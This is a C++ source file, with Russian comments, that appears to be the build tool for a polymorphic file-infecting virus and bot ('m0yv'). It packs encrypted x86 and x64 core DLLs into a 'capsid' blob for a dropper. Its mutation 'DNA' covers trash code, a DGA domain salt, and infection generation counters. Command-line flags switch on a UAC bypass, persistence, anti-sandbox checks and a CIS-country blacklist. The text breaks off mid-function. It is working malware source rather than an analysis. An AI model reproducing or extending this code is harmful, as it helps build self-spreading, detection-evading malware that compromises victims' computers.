/*
используется для генерации блоба капсида из x86.dll и x64.dll для последующей вставки в дроппер нулевого поколения
либо же для тестовой загрузки существующего капсида из capsid.bin в зависимости от разрядности capsid_tools
*/

#include "global.h"
#include "HMexecutable_gen.h"

typedef enum dna_fields_
{
	// флаг о том нужно ли нам использовать фикс энтропии
	USE_ENTROPYFIX = 0,
	// параметр фикса энтропии
	ENTROPYFIX_PARAMETER,
	// флаг использовать трешкод или нет
	USE_TRASHCODE,
	// параметр трешкода
	TRASHCODE_PARAM,
	// сид кодового генератора
	CODEGEN_SEED,
	// сид генератора алгоритма шифрования
	POLYENC_SEED,
	// сид перехватчика управления
	HOOK_SEED,
	// тип окончания стартап-кода: т.к у нас вставляется в восстановлении трамплин после стартапкода мы можем записать любой мусор 
	STARTUP_ENDCODE_TYPE,
	// соль для сида DGA: смещает сид на определенное значения, создавая новые пулы доменов в зависимости от мутации
	DGA_SALT,
	// красная граница активации мутатора
	MUTATOR_BORDER,
	// техническое значение - всего элементов
	DNA_FIELDS_TOTAL
} dna_fields_t;


/*

I. Капсид.

Само ядро инфектора состоит из одной кодовой базы, которая собирается в x86 и x64 длл, после чего эти длл соединяются в специальную структуру-носитель наподобии вирусного капсида

Капсид состоит из:
------------------------------------------------------------------------------------------------------------
........ метаданные о капсиде ........
дворд32 - офсет_начало_86 // смещение от начала структуры до x86 модуля
дворд32 - офсет_вход_86   // смещение от начала структуры до входа в x86 модуль: сюда надо передать управление и указатель на начало капсида для загрузки x86 модуля в память
дворд32 - офсет_64        // смещение от начала структуры до x64 модуля
дворд32 - офсет_вход_64   // смещение от начала структуры до входа в x64 модуль аналогично с x86
дворд32 - размер капсида
........ ядра вируса ........
байт массив - x86 ядро
байт массив - x64 ядро
------------------------------------------------------------------------------------------------------------

входами в 86 и 64 является функция в экспорте DLL, осуществляющая загрузку данной DLL в память. На вход ей передается указатель на начало капсида.
Она использует метаданные из капсида для нахождения начала модуля, а также передает эти метаданные после загрузки в основную процедуру ядра инфектора, который переиспользует их для заражения
капсидом и стартовым кодом новых файлов.

Данный капсид находится в теле носителя в зашифрованном виде, приатаченный к последней секции.
*/

// расширенная инфа о капсиде
#pragma pack(1)
struct capsid_extended
{
	WCHAR parentBotId[128]; // айди бота который заразил данный екзешник
	DWORD32 dwGenCounter; // счетчик поколения заражений 
	DWORD32 dwDNAMutatorCounter; // счетчик количества мутаций ДНК
	DWORD32 dwWayInfected; // флаг о том по какому пути произошло заражение
	DWORD32 dwDNA[dna_fields_t::DNA_FIELDS_TOTAL];
	DWORD32 dwPropCounter; // счетчик длины цепочки распространения: при первом запуске на компьютере инкрементирует эту переменную
};
#pragma pack()

// структура метаданных капсида вируса, следом за ней идут разрядности ядер
#pragma pack(1)
struct capsid_metadata
{
	DWORD32 x86_size;
	DWORD32 x64_size;
	DWORD32 offset_x86core;
	DWORD32 offset_x86entry;
	DWORD32 offset_x64core;
	DWORD32 offset_x64entry;
	DWORD32 size; // размер капсида: метаданные + дллки ядра
	unsigned char core_key[32]; // ключ шифрования x64core и x86core
								// ключ шифрования data_extended структуры - одноразовый блокнот
	unsigned char extended_key[sizeof(capsid_extended)];
	capsid_extended data_extended;
};
#pragma pack()

struct blob
{
	LPBYTE lpBuf;
	SIZE_T dwBufSize;
};

typedef NTSTATUS(WINAPI *fnRtlCompressBuffer)(
	_In_ USHORT CompressionFormatAndEngine,
	_In_ PUCHAR UncompressedBuffer,
	_In_ ULONG UncompressedBufferSize,
	_Out_ PUCHAR CompressedBuffer,
	_In_ ULONG CompressedBufferSize,
	_In_ ULONG UncompressedChunkSize,
	_Out_ PULONG FinalCompressedSize,
	_In_ PVOID WorkSpace
);

typedef NTSTATUS(WINAPI *fnRtlGetCompressionWorkSpaceSize)(USHORT CompressionFormatAndEngine, PULONG CompressBufferWorkSpaceSize, PULONG CompressFragmentWorkSpaceSize);

#define HIVEMIND_CAPSID_COMPRESSION COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_MAXIMUM

BOOL read2blob(PWCHAR pwFileName, blob *out, BOOL bRecursive = FALSE)
{
	printf("reading %S\n", pwFileName);
	BOOL bRet = FALSE;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	do
	{
		hFile = CreateFileW(pwFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			if (bRecursive == FALSE)
			{
				WCHAR wchSelfPath[MAX_PATH + 1];
				GetModuleFileNameW(NULL, wchSelfPath, MAX_PATH);
				for (UINT i = wcslen(wchSelfPath); i > 0; i--)
				{
					if (wchSelfPath[i] == L'\\')
					{
						wchSelfPath[i + 1] = L'\0';
						break;
					}
				}
				lstrcatW(wchSelfPath, pwFileName);
				return read2blob(wchSelfPath, out, TRUE);

			}
			break;
		}
		out->dwBufSize = GetFileSize(hFile, NULL);
		out->lpBuf = new BYTE[out->dwBufSize + 1];
		if (out->lpBuf == nullptr)
			break;

		DWORD dwRead;
		bRet = ReadFile(hFile, out->lpBuf, out->dwBufSize, &dwRead, NULL);

	} while (FALSE);

	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);

	return bRet;
}

int _cdecl m_rand(long *holdrand)
{
	return (((*holdrand = *holdrand * 214013L + 2531011L) >> 16) & 0x7fff);
}

BOOL buf2file(PWCHAR pwFileName, LPBYTE lpBuf, SIZE_T dwSize)
{
	BOOL bRet = FALSE;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	do
	{
		hFile = CreateFileW(pwFileName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
			break;

		DWORD dwWritten;
		bRet = WriteFile(hFile, lpBuf, dwSize, &dwWritten, NULL);

	} while (FALSE);

	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);

	return bRet;
}

DWORD Rva2Offset(BOOL b64, DWORD dwRva, UINT_PTR uiBaseAddress)
{
	WORD wIndex = 0;
	PIMAGE_SECTION_HEADER pSectionHeader = NULL;
	PIMAGE_NT_HEADERS32 pNtHeaders32 = NULL;
	PIMAGE_NT_HEADERS64 pNtHeaders64 = NULL;

	if (b64 == FALSE)
		pNtHeaders32 = (PIMAGE_NT_HEADERS32)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);
	else
		pNtHeaders64 = (PIMAGE_NT_HEADERS64)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);

	if (b64 == FALSE)
		pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders32->OptionalHeader) + pNtHeaders32->FileHeader.SizeOfOptionalHeader);
	else
		pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders64->OptionalHeader) + pNtHeaders64->FileHeader.SizeOfOptionalHeader);

	if (dwRva < pSectionHeader[0].PointerToRawData)
		return dwRva;

	if (b64 == FALSE)
	{
		for (wIndex = 0; wIndex < pNtHeaders32->FileHeader.NumberOfSections; wIndex++)
		{
			if (dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData))
				return (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData);
		}
	}
	else
	{
		for (wIndex = 0; wIndex < pNtHeaders64->FileHeader.NumberOfSections; wIndex++)
		{
			if (dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData))
				return (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData);
		}
	}

	return 0;
}
//===============================================================================================//
DWORD GetEntryFileOffset(BOOL b64, VOID * lpDll)
{
	UINT_PTR uiBaseAddress = 0;
	UINT_PTR uiExportDir = 0;
	UINT_PTR uiNameArray = 0;
	UINT_PTR uiAddressArray = 0;
	UINT_PTR uiNameOrdinals = 0;
	DWORD dwCounter = 0;


	uiBaseAddress = (UINT_PTR)lpDll;

	// get the File Offset of the modules NT Header
	uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

	// uiNameArray = the address of the modules export directory entry
	if (b64 == FALSE)
		uiNameArray = (UINT_PTR)&((PIMAGE_NT_HEADERS32)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	else
		uiNameArray = (UINT_PTR)&((PIMAGE_NT_HEADERS64)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

	// get the File Offset of the export directory
	uiExportDir = uiBaseAddress + Rva2Offset(b64, ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress, uiBaseAddress);

	// get the File Offset for the array of name pointers
	uiNameArray = uiBaseAddress + Rva2Offset(b64, ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames, uiBaseAddress);

	// get the File Offset for the array of addresses
	uiAddressArray = uiBaseAddress + Rva2Offset(b64, ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);

	// get the File Offset for the array of name ordinals
	uiNameOrdinals = uiBaseAddress + Rva2Offset(b64, ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNameOrdinals, uiBaseAddress);

	// get a counter for the number of exported functions...
	dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->NumberOfNames;

	// loop through all the exported functions to find the ReflectiveLoader
	while (dwCounter--)
	{
		char * cpExportedFunctionName = (char *)(uiBaseAddress + Rva2Offset(b64, DEREF_32(uiNameArray), uiBaseAddress));

		if (strstr(cpExportedFunctionName, "entry") != NULL)
		{
			// get the File Offset for the array of addresses
			uiAddressArray = uiBaseAddress + Rva2Offset(b64, ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);

			// use the functions name ordinal as an index into the array of name pointers
			uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));

			// return the File Offset to the ReflectiveLoader() functions code...
			return Rva2Offset(b64, DEREF_32(uiAddressArray), uiBaseAddress);
		}
		// get the next exported function name
		uiNameArray += sizeof(DWORD);

		// get the next exported function name ordinal
		uiNameOrdinals += sizeof(WORD);
	}

	printf("Can't find entry offset\n");
	Sleep(INFINITE);

	return 0;
}

// инкрементит dwInitial до сех пор пока ((dwInitial % (dwReductionValue - dwOffset) + dwOffset) != dwResult
DWORD dwSetValue(DWORD dwInitial, DWORD dwReductionValue, DWORD dwResult, DWORD dwOffset)
{
	DWORD dwRet = dwInitial;

	while (dwResult != ((dwRet % (dwReductionValue - dwOffset)) + dwOffset))
		dwRet++;

	return dwRet;
}

// вайпит всякую хуету из пе файла
VOID wipe_meta(LPBYTE file)
{
	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)file;
	UINT_PTR pNtHeaders = (UINT_PTR)((SIZE_T)pDos + (SIZE_T)pDos->e_lfanew);

	BOOL b64 = FALSE;
	if (((PIMAGE_NT_HEADERS32)pNtHeaders)->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64)
		b64 = TRUE;
	else
		b64 = FALSE;

	printf("Wiping from %s\n", b64 ? "x64" : "x86");

	PIMAGE_DEBUG_DIRECTORY dbg = nullptr;
	PIMAGE_EXPORT_DIRECTORY pExport = nullptr;

	UINT_PTR dbg_RVA = NULL;
	UINT_PTR export_RVA;
	if (b64)
	{
		dbg_RVA = ((PIMAGE_NT_HEADERS64)pNtHeaders)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].VirtualAddress;
		export_RVA = ((PIMAGE_NT_HEADERS64)pNtHeaders)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	}
	else
	{
		dbg_RVA = ((PIMAGE_NT_HEADERS32)pNtHeaders)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].VirtualAddress;
		export_RVA = ((PIMAGE_NT_HEADERS32)pNtHeaders)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	}

	printf("wiping %s Timestamp: 0x%x -> 0\n", b64 ? "x64" : "x86", ((PIMAGE_NT_HEADERS32)pNtHeaders)->FileHeader.TimeDateStamp);
	((PIMAGE_NT_HEADERS32)pNtHeaders)->FileHeader.TimeDateStamp = 0;

	if (dbg_RVA == NULL)
		printf("No IMAGE_DEBUG_DIRECTORY\n");
	else
	{
		dbg = (PIMAGE_DEBUG_DIRECTORY)((SIZE_T)file + (SIZE_T)Rva2Offset(b64, dbg_RVA, (UINT_PTR)file));

		printf("wiping %s IMAGE_DEBUG_DIRECTORY Timestamp: 0x%x -> 0\n", b64 ? "x64" : "x86", dbg->TimeDateStamp);
		dbg->TimeDateStamp = 0;
	}

	if (export_RVA == NULL)
		printf("No IMAGE_EXPORT_DIRECTORY\n");
	else
	{
		pExport = (PIMAGE_EXPORT_DIRECTORY)((SIZE_T)file + (SIZE_T)Rva2Offset(b64, export_RVA, (UINT_PTR)file));
		printf("wiping %s IMAGE_EXPORT_DIRECTORY Timestamp: 0x%x -> 0\n", b64 ? "x64" : "x86", pExport->TimeDateStamp);
		pExport->TimeDateStamp = 0;
	}
}

DWORD align(DWORD n, DWORD a)
{
	if (n % a == 0)
		return n;
	DWORD r = (n / a) * a + a;
	return r;
}

BOOL CompressBuffer(fnRtlCompressBuffer _RtlCompressBuffer, fnRtlGetCompressionWorkSpaceSize _RtlGetCompressionWorkSpaceSize, blob *buf, blob *out)
{
	BOOL bRet = FALSE;

	ULONG dwWorkSpace = 0;
	ULONG tmp = 0;		
	LPBYTE lpByteWorkspace = nullptr;
	NTSTATUS status = _RtlGetCompressionWorkSpaceSize(HIVEMIND_CAPSID_COMPRESSION, &dwWorkSpace, &tmp);
	if (status >= 0)
	{
		
		out->lpBuf = new BYTE[buf->dwBufSize + 1];
		out->dwBufSize = buf->dwBufSize;
		lpByteWorkspace = new BYTE[dwWorkSpace + 1];
		ULONG uBufSize = out->dwBufSize;
		if ((lpByteWorkspace != nullptr) && (out->lpBuf != nullptr))
			bRet = (_RtlCompressBuffer(HIVEMIND_CAPSID_COMPRESSION, buf->lpBuf, buf->dwBufSize, out->lpBuf, out->dwBufSize, 4096, &uBufSize, lpByteWorkspace) >=0 );
		out->dwBufSize = uBufSize;
	}

	if ((!bRet) && (out->lpBuf != nullptr))
		delete[]out->lpBuf;

	if (lpByteWorkspace != nullptr)
		delete[]lpByteWorkspace;

	return bRet;
}

DWORD set_m0yv_flags()
{
	DWORD dwInfectorFlags = 0;
	PWCHAR pwchCommandLine = GetCommandLineW();

	if (wcsstr(pwchCommandLine, L"--fno-bot"))
		dwInfectorFlags |= M0YV_FNO_BOT;

	if (wcsstr(pwchCommandLine, L"--fno-search"))
		dwInfectorFlags |= M0YV_FNO_SEARCH;

	if (wcsstr(pwchCommandLine, L"--fno-persist"))
		dwInfectorFlags |= M0YV_FNO_PERSIST;

	if (wcsstr(pwchCommandLine, L"--uac"))
		dwInfectorFlags |= M0YV_USE_UACBYPASS;

	if (wcsstr(pwchCommandLine, L"--fno-ret"))
		dwInfectorFlags |= M0YV_FNO_RET;

	if (wcsstr(pwchCommandLine, L"--decoy"))
		dwInfectorFlags |= M0YV_USE_DECOY;

	if (wcsstr(pwchCommandLine, L"--flags-propagate"))
		dwInfectorFlags |= M0YV_USE_PROPFLAG;

	if (wcsstr(pwchCommandLine, L"--fno-antisbx"))
		dwInfectorFlags |= M0YV_FNO_ANTISBX;

	if (wcsstr(pwchCommandLine, L"--fno-cisblacklist"))
		dwInfectorFlags |= DBGM0YV_FNO_CIS_CHECK;

	if (dwInfectorFlags == NULL)
		printf("Flags is set to NULL\n");
	else
	{
		printf("Flags is set to: ");

		if (dwInfectorFlags & M0YV_USE_PROPFLAG)
			printf("M0YV_USE_PROPFLAG | ");

		if (dwInfectorFlags & M0YV_FNO_SEARCH)
			printf("M0YV_FNO_SEARCH | ");

		if (dwInfectorFlags & M0YV_FNO_PERSIST)
			printf("M0YV_FNO_PERSIST | ");

		if (dwInfectorFlags & M0YV_FNO_BOT)
			printf("M0YV_FNO_BOT | ");

		if (dwInfectorFlags & M0YV_USE_UACBYPASS)
			printf("M0YV_USE_UACBYPASS | ");

		if (dwInfectorFlags & M0YV_FNO_RET)
			printf("M0YV_FNO_RET | ");

		if (dwInfectorFlags & M0YV_USE_DECOY)
			printf("M0YV_USE_DECOY | ");

		if (dwInfectorFlags & DBGM0YV_FNO_CIS_CHECK)
			printf("DBGM0YV_FNO_CIS_CHECK | ");

		if (dwInfectorFlags & M0YV_FNO_ANTISBX)
			printf("M0YV_FNO_ANTISBX | ");

		printf("NULL\n");
	}

	return dwInfectorFlags;
}

BOOL gen_random(LPBYTE lpBuffer, DWORD dwSize)
{
	HCRYPTPROV hCryptProv;

	BOOL bRet = FALSE;
	do
	{
		if (!CryptAcquireContextW(&hCryptProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
			break;

		bRet = CryptGenRandom(hCryptProv, dwSize, lpBuffer);

	} while (FALSE);

	CryptReleaseContext(hCryptProv, NULL);

	return bRet;
}

VOID apply_cipher(LPBYTE lpBuffer, DWORD dwBufferSize, LPBYTE lpKey)
{
	for (UINT iIndex = 0; iIndex < dwBufferSize; )
	{
		for (UINT iKeyIter = 0; iKeyIter < 32; iKeyIter++, iIndex++)
		{
			if (iIndex == dwBufferSize)
				break;

			lpBuffer[iIndex] = lpBuffer[iIndex] ^ lpKey[iKeyIter];
		}
	}
	return;
}

BOOL encryptcore(capsid_metadata *capsid)
{
	BOOL bRet = FALSE;

	printf("encrypting cores with %d-byte key\n", sizeof(capsid_metadata::core_key));

	LPBYTE lpRawCapsid = (LPBYTE)capsid;
	do
	{
		if (!gen_random(&capsid->core_key[0], sizeof(capsid_metadata::core_key)))
			break;

		apply_cipher(&lpRawCapsid[capsid->offset_x86core], capsid->x86_size, &capsid->core_key[0]);
		apply_cipher(&lpRawCapsid[capsid->offset_x64core], capsid->x64_size, &capsid->core_key[0]);

		bRet = TRUE;

	} while (FALSE);

	return bRet;
}

BOOL gen_capsid(BOOL bHiveExecutable, BOOL bExternalShellcode)
{
	long holdrnd = GetTickCount();
	blob x86_dll;
	blob x64_dll;

	blob x86_shellcode;
	blob x64_shellcode;
	blob x86_entryoffset;
	blob x64_entryoffset;

	blob x64_compressed_dll;
	blob x86_compressed_dll;

	RtlSecureZeroMemory(&x86_dll, sizeof(x86_dll));
	RtlSecureZeroMemory(&x64_dll, sizeof(x64_dll));
	RtlSecureZeroMemory(&x86_shellcode, sizeof(x86_shellcode));
	RtlSecureZeroMemory(&x64_shellcode, sizeof(x64_shellcode));
	RtlSecureZeroMemory(&x86_entryoffset, sizeof(x86_entryoffset));
	RtlSecureZeroMemory(&x64_entryoffset, sizeof(x64_entryoffset));
	RtlSecureZeroMemory(&x64_compressed_dll, sizeof(x64_compressed_dll));
	RtlSecureZeroMemory(&x86_compressed_dll, sizeof(x86_compressed_dll));

	capsid_metadata *capsid = nullptr;
	SIZE_T dwCapsidSize = 0;
	fnRtlCompressBuffer _RtlCompressBuffer = nullptr;
	fnRtlGetCompressionWorkSpaceSize _RtlGetCompressionWorkSpaceSize = nullptr;
	BOOL bRet = FALSE;
	do
	{
		HMODULE hNtDll = GetModuleHandleA("ntdll.dll");
		if (hNtDll == NULL)
			break;

		fnRtlCompressBuffer _RtlCompressBuffer = (fnRtlCompressBuffer)GetProcAddress(hNtDll, "RtlCompressBuffer");
		fnRtlGetCompressionWorkSpaceSize _RtlGetCompressionWorkSpaceSize = (fnRtlGetCompressionWorkSpaceSize)GetProcAddress(hNtDll, "RtlGetCompressionWorkSpaceSize");
		if ((_RtlCompressBuffer == nullptr) || (_RtlGetCompressionWorkSpaceSize == nullptr))
			break;

		printf("Reading core dlls...\n");
#ifndef _DEBUG
		if (!read2blob(L"x86.dll", &x86_dll))
			break;

		if (!read2blob(L"x64.dll", &x64_dll))
			break;

		if (bExternalShellcode)
		{
			if (!read2blob(L"Shellcode_x86.bin", &x86_shellcode))
				break;
			if (!read2blob(L"Shellcode_x64.bin", &x64_shellcode))
				break;
			if (!read2blob(L"x86_dword_offset.txt", &x86_entryoffset))
				break;
			if (!read2blob(L"x64_dword_offset.txt", &x64_entryoffset))
				break;
	}
#else
		if (!read2blob(L"G:\\Work\\APRCS\\capsid_tools\\Release\\x86.dll", &x86_dll))
			break;

		if (!read2blob(L"G:\\Work\\APRCS\\capsid_tools\\Release\\x64.dll", &x64_dll))
			break;

		if (bExternalShellcode)
		{
			if (!read2blob(L"G:\\Work\\APRCS\\capsid_tools\\Release\\Shellcode_x86.bin", &x86_shellcode))
				break;
			if (!read2blob(L"G:\\Work\\APRCS\\capsid_tools\\Release\\Shellcode_x64.bin", &x64_shellcode))
				break;
			if (!read2blob(L"G:\\Work\\APRCS\\capsid_tools\\Release\\x86_dword_offset.txt", &x86_entryoffset))
				break;
			if (!read2blob(L"G:\\Work\\APRCS\\capsid_tools\\Release\\x64_dword_offset.txt", &x64_entryoffset))
				break;
		}
#endif


		wipe_meta(x86_dll.lpBuf);
		wipe_meta(x64_dll.lpBuf);

		// конвертнем хидеры если надо
		if (bHiveExecutable)
		{
			DWORD dwKey64 = 0;
			DWORD dwKey86 = 0;
			ConvertHeaders((PIMAGE_DOS_HEADER)x86_dll.lpBuf);
			ConvertHeaders((PIMAGE_DOS_HEADER)x64_dll.lpBuf);
			dwKey86 = GenKey(TRUE, (PIMAGE_HIVEMIND_HEADER)x86_dll.lpBuf);
			dwKey64 = GenKey(TRUE, (PIMAGE_HIVEMIND_HEADER)x64_dll.lpBuf);

			EncryptPointers((PIMAGE_HIVEMIND_HEADER)x86_dll.lpBuf, dwKey86);
			EncryptPointers((PIMAGE_HIVEMIND_HEADER)x64_dll.lpBuf, dwKey64);

			EncryptEntryPoint((PIMAGE_HIVEMIND_HEADER)x86_dll.lpBuf, dwKey86, FALSE);
			EncryptEntryPoint((PIMAGE_HIVEMIND_HEADER)x64_dll.lpBuf, dwKey64, TRUE);

			EncryptImportNames((PIMAGE_HIVEMIND_HEADER)x86_dll.lpBuf, dwKey86, FALSE);
			EncryptImportNames((PIMAGE_HIVEMIND_HEADER)x64_dll.lpBuf, dwKey64, TRUE);
		}


		DWORD dwEntry86Offset = 0;
		DWORD dwEntry64Offset = 0;

		// заполнение метаданных капсида

		DWORD dwOffsetShellcodex86 = 0;
		DWORD dwOffsetShellcodex64 = 0;

		// если Reflective режим
		if (!bExternalShellcode)
		{			
			dwCapsidSize = sizeof(capsid_metadata) + x86_dll.dwBufSize + x64_dll.dwBufSize;
			// выравнивание размера капсида до 4096 байт, что является 2 в 12 степени, нужно для полиморфного движка
			// так как он генерирует итераторы декриптора кратные степени двойки вплоть до 12 степени
			dwCapsidSize = align(dwCapsidSize, CAPSID_ALIGNMENT);
			printf("Generating *REFLECTIVE* capsid %d bytes structure...\n", dwCapsidSize);


			capsid = (capsid_metadata*)new BYTE[dwCapsidSize + 1];
			if (capsid == nullptr)
				break;
			RtlSecureZeroMemory(capsid, dwCapsidSize);

			capsid->size = dwCapsidSize;
			// 86 бот сразу за метаданными
			capsid->offset_x86core = sizeof(capsid_metadata);
			// x64 бот сразу за x86 ботом => размер x86 + офсет до x86 = офсет до x64
			capsid->offset_x64core = capsid->offset_x86core + x86_dll.dwBufSize;

			// вход в загрузчик на экспорте самих длл
			dwEntry86Offset = GetEntryFileOffset(FALSE, x86_dll.lpBuf);
			dwEntry64Offset = GetEntryFileOffset(TRUE, x64_dll.lpBuf);

			capsid->offset_x86entry = capsid->offset_x86core + dwEntry86Offset;
			capsid->offset_x64entry = capsid->offset_x64core + dwEntry64Offset;

			capsid->x86_size = x86_dll.dwBufSize;
			capsid->x64_size = x64_dll.dwBufSize;
		}
		else // если External shellcode режим
		{

			if ((!CompressBuffer(_RtlCompressBuffer, _RtlGetCompressionWorkSpaceSize, &x86_dll, &x86_compressed_dll)) || (!CompressBuffer(_RtlCompressBuffer, _RtlGetCompressionWorkSpaceSize, &x64_dll, &x64_compressed_dll)))
			{
				printf("Cant compress buffer\n");
				break;
			}

			printf("Original / Compressed size x86 = %d/%d, x64 = %d/%d\n", x86_dll.dwBufSize, x86_compressed_dll.dwBufSize, x64_dll.dwBufSize, x64_compressed_dll.dwBufSize);

			DWORD dwDeltax86 = _wtoi((PWCHAR)x86_entryoffset.lpBuf);
			DWORD dwDeltax64 = _wtoi((PWCHAR)x64_entryoffset.lpBuf);

			dwCapsidSize = sizeof(capsid_metadata) + x86_compressed_dll.dwBufSize + x64_compressed_dll.dwBufSize + x86_shellcode.dwBufSize + x64_shellcode.dwBufSize;
			dwCapsidSize = align(dwCapsidSize, CAPSID_ALIGNMENT);
			printf("Generating *SHELLCODE* capsid %d bytes structure... Offset x86 = %d, offset x64 = %d\n", dwCapsidSize, dwDeltax86, dwDeltax64);

			capsid = (capsid_metadata*)new BYTE[dwCapsidSize + 1];
			if (capsid == nullptr)
				break;
			RtlSecureZeroMemory(capsid, dwCapsidSize);

	/*
	след расположение:
	метаданные
	x86 длл
	x86 шеллкод
	x64 длл
	x64 шеллкод
	точка входа в шеллкод не в самом начале, а по оффсету от начала шеллкода в dwDeltax86/dwDeltax64
	*/
			capsid->size = dwCapsidSize;
			// 86 бот сразу за метаданными
			capsid->offset_x86core = sizeof(capsid_metadata);
			// оффсет до начало x86 загрузчика = оффсет до x86 + размер x86 так как он следует сразу после x86 длл
			dwOffsetShellcodex86 = capsid->offset_x86core + x86_compressed_dll.dwBufSize;
			// начало загрузчика + оффсет от начала шеллкода до точки входа = оффсет до точки входа с начала капсида
			capsid->offset_x86entry = dwOffsetShellcodex86 + dwDeltax86;
			
			// начало x64 длл - оффсет шеллкода 86 + его размер, т.к x64 длл следует сразу после
			capsid->offset_x64core = dwOffsetShellcodex86 + x86_shellcode.dwBufSize;
			// x64 шеллкод следует сразу после dll
			dwOffsetShellcodex64 = capsid->offset_x64core + x64_compressed_dll.dwBufSize;
			capsid->offset_x64entry = dwOffsetShellcodex64 + dwDeltax64;

			capsid->x86_size = x86_compressed_dll.dwBufSize;
			capsid->x64_size = x64_compressed_dll.dwBufSize;

		}

		// расширенные данные по дефолту нулевые
		RtlSecureZeroMemory(capsid->extended_key, sizeof(capsid->extended_key));
		RtlSecureZeroMemory(&capsid->data_extended, sizeof(capsid->data_extended));

		// вставим ДНК-код
		// сгенерируем случайным образом, а потом нужные переменные подправим руками
		long holdrand_DNAgen = 0x81930AAE;
		LPBYTE lpArrayBytesDNA = (LPBYTE)capsid->data_extended.dwDNA;
		for (UINT i = 0; i < sizeof(capsid_extended::dwDNA); i++)
			lpArrayBytesDNA[i] = m_rand(&holdrand_DNAgen);


		capsid->data_extended.dwDNA[dna_fields_t::MUTATOR_BORDER] = dwSetValue(capsid->data_extended.dwDNA[dna_fields_t::MUTATOR_BORDER], 300, 70, 70);
		capsid->data_extended.dwDNA[dna_fields_t::USE_ENTROPYFIX] = dwSetValue(capsid->data_extended.dwDNA[dna_fields_t::USE_ENTROPYFIX], 2, 1, 0);
		capsid->data_extended.dwDNA[dna_fields_t::USE_TRASHCODE] = dwSetValue(capsid->data_extended.dwDNA[dna_fields_t::USE_TRASHCODE], 2, 1, 0);
		capsid->data_extended.dwDNA[dna_fields_t::STARTUP_ENDCODE_TYPE] = dwSetValue(capsid->data_extended.dwDNA[dna_fields_t::STARTUP_ENDCODE_TYPE], 4, 3, 0);
		capsid->data_extended.dwDNA[dna_fields_t::ENTROPYFIX_PARAMETER] = dwSetValue(capsid->data_extended.dwDNA[dna_fields_t::ENTROPYFIX_PARAMETER], 3, 2, 0);

		capsid->data_extended.dwWayInfected = set_m0yv_flags();
		capsid->data_extended.dwPropCounter = 0;

		// сгенерируем гамму для гаммирования расширенной структуры и тут же произведем гаммирование
		LPBYTE lpDataExtendedRaw = (LPBYTE)&capsid->data_extended;
		for (UINT iCounter = 0; iCounter < sizeof(capsid->extended_key); iCounter++)
		{
			capsid->extended_key[iCounter] = m_rand(&holdrnd) % 256;
			lpDataExtendedRaw[iCounter] ^= capsid->extended_key[iCounter];
		}

		// запишем в капсид блобы

		LPBYTE lpRawCapsid = (LPBYTE)capsid;

		// в режиме шеллкода надо еще скопировать шеллкоды
		if (bExternalShellcode)
		{
			memcpy(&lpRawCapsid[capsid->offset_x86core], x86_compressed_dll.lpBuf, x86_compressed_dll.dwBufSize);
			memcpy(&lpRawCapsid[capsid->offset_x64core], x64_compressed_dll.lpBuf, x64_compressed_dll.dwBufSize);

			memcpy(&lpRawCapsid[dwOffsetShellcodex86], x86_shellcode.lpBuf, x86_shellcode.dwBufSize);
			memcpy(&lpRawCapsid[dwOffsetShellcodex64], x64_shellcode.lpBuf, x64_shellcode.dwBufSize);
		}
		else // в рефлективном просто обычные длл и без сжатия
		{
			memcpy(&lpRawCapsid[capsid->offset_x86core], x86_dll.lpBuf, x86_dll.dwBufSize);
			memcpy(&lpRawCapsid[capsid->offset_x64core], x64_dll.lpBuf, x64_dll.dwBufSize);
		}

		if (!encryptcore(capsid))
		{
			printf("error encrypting m0yv cores\n");
			break;
		}

		bRet = buf2file(L"capsid.bin", (LPBYTE)capsid, capsid->size);

		if (bHiveExecutable)
		{
			printf("Saving m0yv executable to x86.hm and x64.hm\n");
			buf2file(L"x86.hm", (LPBYTE)x86_dll.lpBuf, x86_dll.dwBufSize);
